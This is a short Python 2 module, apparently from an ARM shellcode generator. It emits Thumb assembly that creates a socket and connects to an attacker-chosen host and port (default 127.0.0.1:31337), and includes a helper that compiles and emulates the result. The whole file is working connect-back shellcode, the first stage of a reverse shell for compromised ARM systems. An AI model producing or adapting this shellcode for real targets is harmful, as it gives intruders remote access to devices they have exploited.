from socket import htons, inet_aton, gethostbyname
from struct import unpack

def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337):
    """Connects to remote machine on specific port

    Args:
        host(str): hostname or IP address

        port(int/str): specific port
    """

    sc = """
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2
    sub r7, r7, r7
    add r7, r7, #255
    add r7, r7, #26
    svc 1
    #adr r1, sockaddr_1
    mov r1, pc
    add r1, #12
    mov r2, #16
    mov r3, #2
    mov r6, r0
    strh r3, [r1]
    b after_sockaddr_2
    sub r1, r1, r1

sockaddr_1:
    .short 0x4141
    .short %s
    .word  %s
    
after_sockaddr_2:
    sub r7, r7, r7
    add r7, r7, #255
    add r7, r7, #28
    svc 1
    """ % (htons(int(port)), u32(binary_ip(host)))
    return sc

def testcase(host='127.0.0.1', port=31337):
    import ARMSCGen as scgen
    scgen.prepareCompiler('THUMB')
    sc = scgen.CompileSC(generate(host, port), isThumb=True)
    sclen = len(sc)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)

if __name__ == '__main__':
    print generate()
